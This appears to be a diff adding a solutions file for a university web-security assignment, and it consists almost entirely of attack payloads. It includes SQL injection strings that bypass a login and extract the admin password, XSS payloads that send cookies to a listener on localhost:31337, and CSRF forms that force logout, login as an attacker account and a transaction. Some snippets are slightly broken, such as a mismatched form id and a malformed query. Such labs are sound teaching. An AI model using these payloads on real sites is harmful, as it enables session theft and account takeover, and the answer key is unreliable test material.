@@ -1,0 +1,29 @@
+Project 3 Solutions:
+
+Username: admin
+Password: swordfish' OR ''='
+
+Username: admin
+Password: swordfish' OR ''='' UNION SELECT password FROM users WHERE username ='admin'--;
+
+<script>fetch('http://localhost:31337/stolen?cookies=' + document.cookie, {method: 'GET',})</script>
+<IMG SRC="" onerror="fetch('http://localhost:31337/stolen?cookies='+document.cookie, { method: 'GET',});"></img>
+<iframe SRC="" onload="fetch('http://localhost:31337/stolen?cookies='+document.cookie);"></iframe>
+
+<form id="logout-form" action="https://csci3403.com/proj3/logout" method="POST"></form>
+<script>document.getElementById("logout-form").submit()</script>
+
+<form id="login-form" action="https://csci3403.com/proj3/login" method="POST"> 
+    <input id="username" name="username" type="text" value="attacker">
+    <input id="userpass" name="password" type="password" value="l33th4x">
+</form>
+<script> document.getElementById("login-form").submit()</script>
+
+
+SELECT username, profile_picture FROM users WHERE username LIKE '%'105 OR 1=1'%' AND private=False
+
+<script alert()></script>
+
+<form id="transaction_form" action="https://final.csci3403.com/transaction" method="POST"></form>
+<script>document.getElementById("transaction-form").submit()</script>
+
